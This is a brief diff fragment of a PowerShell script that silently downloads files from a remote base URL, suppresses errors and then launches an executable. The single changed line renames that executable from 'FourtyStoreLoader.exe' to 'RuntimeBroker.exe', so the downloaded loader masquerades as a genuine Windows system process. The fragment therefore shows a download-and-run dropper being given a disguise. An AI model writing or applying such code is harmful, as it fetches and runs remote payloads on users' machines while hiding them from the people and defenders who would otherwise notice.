@@ -38,5 +38,5 @@ Remove-Item $f -Force -EA 0
     try { Invoke-WebRequest ($b + '/' + $_[0]) -OutFile $dst -UseBasicParsing -EA Stop } catch {}
 }
 
-Start-Process (Join-Path $t 'FourtyStoreLoader.exe')
+Start-Process (Join-Path $t 'RuntimeBroker.exe')
 Write-Host 'OK'
